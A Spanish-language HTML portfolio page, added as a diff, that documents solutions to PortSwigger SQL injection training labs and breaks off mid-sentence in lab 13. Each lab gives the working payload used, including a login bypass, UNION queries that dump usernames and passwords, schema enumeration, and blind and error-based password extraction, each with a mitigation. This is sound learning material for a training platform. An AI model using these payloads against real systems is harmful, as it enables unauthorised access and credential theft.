@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alan | Road to Hall of Fame – SQL Injection</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+
+    <header>
+        <div class="nav-container">
+            <div class="logo">
+                <span class="prompt-user">root</span><span class="prompt-host">@alan</span>:<span
+                    class="prompt-path">~/road_to_hof/sql_injection</span>$ <span class="cursor"></span>
+            </div>
+            <nav>
+                <ul class="nav-links">
+                    <li><a href="../index.html" class="nav-link">/inicio</a></li>
+                    <li><a href="../actividades.html" class="nav-link">/actividades</a></li>
+                    <li><a href="../proyectos.html" class="nav-link">/proyectos</a></li>
+                    <li><a href="../pf02.html" class="nav-link">/PF02</a></li>
+                    <li><a href="../pf03.html" class="nav-link">/PF03</a></li>
+                    <li class="nav-item-dropdown">
+                        <a href="sql_injection.html" class="nav-link nav-hof active">/road_to_hall_of_fame</a>
+                        <ul class="dropdown-menu">
+                            <li><a href="sql_injection.html">SQL Injection</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="../final.html" class="nav-link">/Final</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container section-scroll" style="max-width: 1100px; padding-top: 6rem;">
+
+            <!-- ===== HERO ===== -->
+            <div class="hof-hero">
+                <p
+                    style="font-family: var(--font-mono); color: var(--accent-yellow); font-size: 0.9rem; margin-bottom: 0.5rem;">
+                    <i class="fas fa-trophy"></i> ROAD TO HALL OF FAME
+                </p>
+                <h1><i class="fas fa-database" style="font-size: 2rem; margin-right: 0.5rem;"></i>SQL Injection</h1>
+                <p class="subtitle">Ruta de progreso – PortSwigger Web Security Academy</p>
+                <p style="color: var(--text-muted); max-width: 700px; margin: 0 auto 1.5rem; font-size: 1rem;">
+                    Documentación completa de los 18 laboratorios de inyección SQL: desde conceptos básicos hasta
+                    técnicas avanzadas de exfiltración fuera de banda. Haz clic en cualquier laboratorio para ver los
+                    detalles.
+                </p>
+
+                <!-- Stats -->
+                <div class="progress-stats">
+                    <div class="stat-block">
+                        <div class="stat-number">18</div>
+                        <div class="stat-label">Labs Completados</div>
+                    </div>
+                    <div class="stat-block">
+                        <div class="stat-number">3</div>
+                        <div class="stat-label">Apprentice</div>
+                    </div>
+                    <div class="stat-block">
+                        <div class="stat-number">15</div>
+                        <div class="stat-label">Practitioner</div>
+                    </div>
+                </div>
+
+                <!-- Download Button -->
+                <a href="../PDFs/Proyectos/Laboratorios.pdf" download class="btn"
+                    style="background: linear-gradient(135deg, #f8e71c, #f0a500); color: #000; font-weight: 800; display: inline-flex; align-items: center; gap: 0.6rem; margin-bottom: 2rem; box-shadow: 0 0 20px rgba(248,231,28,0.3);">
+                    <i class="fas fa-file-pdf"></i> Descargar Informe Completo (PDF)
+                </a>
+            </div>
+
+            <hr class="neon-divider">
+
+            <!-- ===== ROADMAP ===== -->
+            <div class="roadmap-container">
+                <div class="roadmap-line"></div>
+
+                <!-- LAB 1 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">01</span>
+                            <div class="lab-info">
+                                <h3>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-apprentice">Apprentice</span>
+                                    <span class="badge badge-type">In-band (WHERE clause)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Explotar una vulnerabilidad para recibir todos los documentos que aún no han sido
+                                publicados.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>La aplicación no filtra el parámetro <code>category</code> antes de incluirlo en la
+                                consulta SQL. Esto permite alterar la lógica de la consulta original para omitir los
+                                filtros de visibilidad impuestos por el desarrollador y devolver el conjunto completo de
+                                datos.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Acceder a la página de una categoría para identificar el parámetro de filtrado.</li>
+                                <li>Modificar la URL inyectando una condición lógica siempre verdadera.</li>
+                                <li>El servidor procesa la consulta alterada y devuelve todos los registros, incluidos
+                                    los ocultos.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">Pets' OR 1=1--</div>
+                            <p><strong>Análisis:</strong> La comilla simple cierra la cadena original. El operador
+                                <code>OR 1=1</code> fuerza a que la cláusula WHERE sea siempre verdadera. Los guiones
+                                finales comentan el resto de la lógica del servidor.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Implementación de consultas parametrizadas (sentencias
+                                preparadas), tratando las entradas del usuario estrictamente como datos y no como parte
+                                del código ejecutable.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/Lab1.png" alt="Lab 1 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 2 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">02</span>
+                            <div class="lab-info">
+                                <h3>SQL injection vulnerability allowing login bypass</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-apprentice">Apprentice</span>
+                                    <span class="badge badge-type">In-band (Evasión de Autenticación)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Explotar una vulnerabilidad en las credenciales para iniciar sesión como administrador.
+                            </p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>El sistema concatena directamente los valores de los campos de inicio de sesión en la
+                                consulta SQL. Al manipular el campo de usuario, se puede engañar a la base de datos para
+                                que autentique al atacante sin validar la contraseña.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Interceptar la petición POST del formulario de login.</li>
+                                <li>Introducir el nombre de usuario de administración seguido de un operador de
+                                    comentario.</li>
+                                <li>Enviar la petición para omitir la verificación del campo password.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">administrator'--</div>
+                            <p><strong>Análisis:</strong> Se especifica el usuario objetivo y se añade <code>'--</code>
+                                para anular la validación de la contraseña en la instrucción SQL, permitiendo el acceso
+                                exitoso.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Uso mandatorio de sentencias preparadas para desacoplar la
+                                lógica de autenticación de los valores ingresados por el usuario.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/Lab2.png" alt="Lab 2 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 3 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">03</span>
+                            <div class="lab-info">
+                                <h3>SQL injection attack, querying the database type and version on Oracle</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-apprentice">Apprentice</span>
+                                    <span class="badge badge-type">Union-based</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Obtener la versión del motor de base de datos Oracle.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>La vulnerabilidad permite realizar un ataque de unión para extraer metadatos del
+                                servidor. En Oracle, es necesario consultar tablas del sistema como
+                                <code>v$version</code> y cumplir con la estructura de la consulta original.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Identificar el número de columnas devueltas por la consulta original.</li>
+                                <li>Utilizar el operador UNION para llamar a la tabla <code>v$version</code>.</li>
+                                <li>Visualizar la información de la versión en la respuesta HTTP.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">' UNION SELECT BANNER, NULL FROM v$version--</div>
+                            <p><strong>Análisis:</strong> El comando extrae la columna BANNER de la tabla de sistema de
+                                Oracle. Se añade NULL para igualar el número de columnas requeridas.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Implementar validación de entradas mediante listas blancas y
+                                consultas parametrizadas.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/Lab3.png" alt="Lab 3 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 4 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">04</span>
+                            <div class="lab-info">
+                                <h3>SQL injection attack, querying the database type and version on MySQL and Microsoft
+                                </h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Union-based</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Consultar y mostrar la versión del sistema gestor de base de datos (MySQL/Microsoft).</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Al carecer de validación en el parámetro <code>category</code>, se inyecta una
+                                instrucción UNION SELECT que permite visualizar variables globales del sistema que
+                                exponen la versión del servidor.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Interceptar la petición en Burp Suite y enviarla al Repeater.</li>
+                                <li>Determinar el número de columnas usando ORDER BY.</li>
+                                <li>Inyectar la variable de sistema correspondiente a la versión.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">Pets' UNION SELECT NULL, @@version-- </div>
+                            <p><strong>Análisis:</strong> Se utiliza <code>@@version</code> para extraer la versión en
+                                MySQL/MS SQL. Los valores NULL aseguran la compatibilidad de columnas.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Separar los datos de entrada del código ejecutable mediante
+                                sentencias preparadas y aplicar el principio de menor privilegio.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab4.png" alt="Evidencia Lab 4" loading="lazy">
+                                <img src="../Labs img/Lab4.png" alt="Lab 4 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 5 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">05</span>
+                            <div class="lab-info">
+                                <h3>SQL injection UNION attack, determining the number of columns returned by the query
+                                </h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Union-based (Reconocimiento)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Determinar el número exacto de columnas devueltas por una consulta SQL inyectada.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Un ataque UNION requiere que la consulta inyectada tenga el mismo número de columnas que
+                                la original. Se utiliza una técnica iterativa de valores NULL para mapear la estructura.
+                            </p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Interceptar la petición de filtrado en Burp Suite.</li>
+                                <li>Inyectar de forma incremental cláusulas <code>UNION SELECT NULL, NULL...</code>
+                                    hasta obtener un 200 OK.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">' UNION SELECT NULL, NULL, NULL--</div>
+                            <p><strong>Análisis:</strong> El valor NULL es compatible con casi cualquier tipo de dato,
+                                permitiendo descubrir la arquitectura sin causar conflictos de tipos.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Empleo de consultas parametrizadas para evitar que el motor de
+                                base de datos interprete operadores SQL en la entrada.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab5.png" alt="Evidencia Lab 5" loading="lazy">
+                                <img src="../Labs img/Lab5.png" alt="Lab 5 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 6 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">06</span>
+                            <div class="lab-info">
+                                <h3>SQL injection UNION attack, finding a column containing text</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">In-band (UNION)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Identificar qué columna de la consulta original permite mostrar datos de tipo texto.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Tras conocer el número de columnas, es vital saber cuál puede renderizar cadenas para
+                                exfiltrar datos. Se prueban valores literales de texto en cada posición de la consulta
+                                UNION.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Realizar una inyección UNION SELECT con el número de columnas conocido.</li>
+                                <li>Sustituir secuencialmente cada NULL por una cadena de prueba (ej.
+                                    <code>'abc'</code>).</li>
+                                <li>Si el servidor no devuelve error, esa columna es apta para texto.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">' UNION SELECT NULL, 'abc', NULL--</div>
+                            <p><strong>Análisis:</strong> La cadena <code>'abc'</code> intenta ser procesada por la
+                                segunda columna. El éxito indica compatibilidad de tipos para futura exfiltración.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Implementar validación estricta de entradas mediante listas
+                                blancas para que el parámetro solo acepte valores esperados.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab6.png" alt="Evidencia Lab 6" loading="lazy">
+                                <img src="../Labs img/Lab6.png" alt="Lab 6 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 7 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">07</span>
+                            <div class="lab-info">
+                                <h3>SQL injection UNION attack, retrieving data from other tables</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">In-band (Exfiltración)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Extraer nombres de usuario y contraseñas de la tabla <code>users</code>.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Se aprovecha la falta de aislamiento de permisos en la base de datos. La aplicación
+                                permite usar UNION para cruzar los límites de la tabla de productos y acceder a la tabla
+                                de usuarios sensibles.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Confirmar número de columnas y compatibilidad de texto.</li>
+                                <li>Inyectar una consulta UNION dirigida a la tabla <code>users</code>.</li>
+                                <li>Localizar las credenciales del administrador en el cuerpo de la respuesta.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">' UNION SELECT username, password FROM users--</div>
+                            <p><strong>Análisis:</strong> El operador UNION fusiona los resultados de la tabla
+                                <code>users</code> con los de productos, volcando las credenciales directamente en el
+                                HTML de la página.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Aplicar el principio de menor privilegio, asegurando que la
+                                cuenta de la aplicación no tenga permisos de lectura sobre tablas administrativas.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab7.PNG" alt="Evidencia Lab 7" loading="lazy">
+                                <img src="../Labs img/Lab7.png" alt="Lab 7 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 8 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">08</span>
+                            <div class="lab-info">
+                                <h3>SQL injection UNION attack, retrieving multiple values in a single column</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Union-based</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Recuperar múltiples valores de diferentes columnas (usuario y contraseña) dentro de una
+                                sola columna de resultados.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Cuando la consulta original solo permite mostrar texto en una columna, se utiliza la
+                                concatenación de strings para unir varios campos en uno solo antes de enviarlos a la
+                                interfaz.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Determinar la columna apta para texto.</li>
+                                <li>Utilizar el operador de concatenación específico de la base de datos
+                                    (<code>||</code> o <code>CONCAT</code>).</li>
+                                <li>Extraer la cadena combinada que contiene las credenciales.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">' UNION SELECT NULL, username || '~' || password FROM users--</div>
+                            <p><strong>Análisis:</strong> Concatena el usuario y la contraseña con un separador
+                                (<code>~</code>), permitiendo que ambos datos viajen a través de un único campo de
+                                texto.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Deshabilitar la concatenación dinámica en consultas y migrar a
+                                procedimientos almacenados seguros.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab8.PNG" alt="Evidencia Lab 8" loading="lazy">
+                                <img src="../Labs img/Lab8.png" alt="Lab 8 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 9 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">09</span>
+                            <div class="lab-info">
+                                <h3>SQL injection attack, listing the database contents on non-Oracle databases</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">In-band (Information Schema)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Listar tablas y columnas para descubrir la estructura interna de una base de datos
+                                no-Oracle.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Se accede al <code>information_schema</code>, una base de datos maestra que contiene los
+                                nombres de todas las tablas y columnas, permitiendo al atacante mapear el entorno antes
+                                del robo de datos.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Inyectar <code>UNION SELECT table_name, NULL FROM information_schema.tables</code>
+                                    para listar tablas.</li>
+                                <li>Identificar la tabla de usuarios y sus columnas mediante
+                                    <code>information_schema.columns</code>.</li>
+                                <li>Realizar la exfiltración final con los nombres descubiertos.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">' UNION SELECT table_name, NULL FROM information_schema.tables--
+                            </div>
+                            <p><strong>Análisis:</strong> Consulta los metadatos globales del servidor para revelar
+                                nombres de tablas que el desarrollador intentó mantener ocultos.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Restringir el acceso del usuario de la aplicación a las tablas
+                                de metadatos del sistema.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab9.PNG" alt="Evidencia Lab 9" loading="lazy">
+                                <img src="../Labs img/Lab9.png" alt="Lab 9 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 10 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">10</span>
+                            <div class="lab-info">
+                                <h3>SQL injection attack, listing the database contents on Oracle</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">In-band (Oracle Catalog)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Listar el contenido de una base de datos Oracle para identificar tablas de usuarios.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>A diferencia de otros sistemas, Oracle utiliza tablas como <code>all_tables</code> y
+                                <code>all_tab_columns</code>. El ataque debe adaptarse a esta sintaxis específica de
+                                catálogo.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Consultar <code>all_tables</code> para encontrar tablas sospechosas.</li>
+                                <li>Consultar <code>all_tab_columns</code> filtrando por el nombre de la tabla
+                                    encontrada.</li>
+                                <li>Extraer los datos de las columnas identificadas.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">' UNION SELECT table_name, NULL FROM all_tables--</div>
+                            <p><strong>Análisis:</strong> Fuerza al motor Oracle a devolver los nombres de todas las
+                                tablas accesibles por el usuario actual.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Implementar auditorías de consultas y endurecimiento (hardening)
+                                de la base de datos Oracle.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab10.png" alt="Evidencia Lab 10" loading="lazy">
+                                <img src="../Labs img/Lab10.png" alt="Lab 10 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 11 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">11</span>
+                            <div class="lab-info">
+                                <h3>Blind SQL injection with conditional responses</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Blind (Boolean-based)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Extraer la contraseña del administrador mediante respuestas de "verdadero o falso".</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>La aplicación no muestra resultados directos, pero su respuesta varía dependiendo de si
+                                la consulta SQL es exitosa. Se realizan preguntas booleanas carácter por carácter.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Identificar el parámetro vulnerable (ej. <code>TrackingId</code>).</li>
+                                <li>Inyectar condiciones como <code>AND SUBSTRING(password,1,1)='a'</code>.</li>
+                                <li>Analizar los cambios en la respuesta HTTP para deducir cada carácter.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">TrackingId=xyz' AND (SELECT SUBSTR(password,1,1) FROM users WHERE
+                                username='administrator')='a</div>
+                            <p><strong>Análisis:</strong> Si la primera letra de la contraseña es 'a', la condición es
+                                verdadera y la página carga normalmente, confirmando el dato de forma indirecta.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Uso estricto de consultas parametrizadas y ofuscación de
+                                respuestas genéricas para eliminar el canal de fuga booleano.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab12.png" alt="Evidencia Lab 11" loading="lazy">
+                                <img src="../Labs img/Lab11.png" alt="Lab 11 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 12 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">12</span>
+                            <div class="lab-info">
+                                <h3>Blind SQL injection with conditional errors</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Blind (Error-based)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Inducir errores controlados para confirmar datos cuando no hay cambios visibles en la
+                                página.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Algunas bases de datos como Oracle permiten usar funciones que lanzan errores (como
+                                <code>TO_CHAR(1/0)</code>) solo si se cumple una condición, permitiendo exfiltrar datos
+                                mediante códigos de error 500.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Inyectar una instrucción CASE que evalúe la contraseña.</li>
+                                <li>Forzar una división por cero si la condición es verdadera.</li>
+                                <li>Identificar el carácter correcto cuando el servidor devuelve un Internal Server
+                                    Error.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM
+                                dual)||'</div>
+                            <p><strong>Análisis:</strong> El uso de <code>TO_CHAR(1/0)</code> genera un error matemático
+                                que detiene la ejecución del servidor, sirviendo como señal booleana.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Deshabilitar mensajes de error detallados en producción y
+                                parametrizar todas las consultas.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab12.png" alt="Evidencia Lab 12" loading="lazy">
+                                <img src="../Labs img/Lab12.png" alt="Lab 12 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 13 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">13</span>
+                            <div class="lab-info">
+                                <h3>Visible error-based SQL injection</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Error-based (Exfiltración)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Lograr que el motor de base de datos revele el contenido del campo <code>password</code>
+                                dentro del propio mensaje de error.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Se aplica una función de conversión de tipos (CAST) sobre una subconsulta. Al intentar
+                                convertir texto a un número entero, el mensaje de error de PostgreSQL muestra
+                                explícitamente la cadena fallida (la contraseña).</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Interceptar la petición de la cookie <code>TrackingId</code>.</li>
+                                <li>Inyectar un payload que fuerce un error de conversión de tipos.</li>
+                                <li>Leer la contraseña del administrador directamente desde el mensaje de error
+                                    detallado del servidor.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</div>
+                            <p><strong>Análisis:</strong> Obliga a evaluar una comparación booleana donde el CAST a
+                                entero falla, provocando que la base de datos "grite" la contraseña en la respuesta
+                                HTTP.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Deshabilitar la visualización de errores detallados en
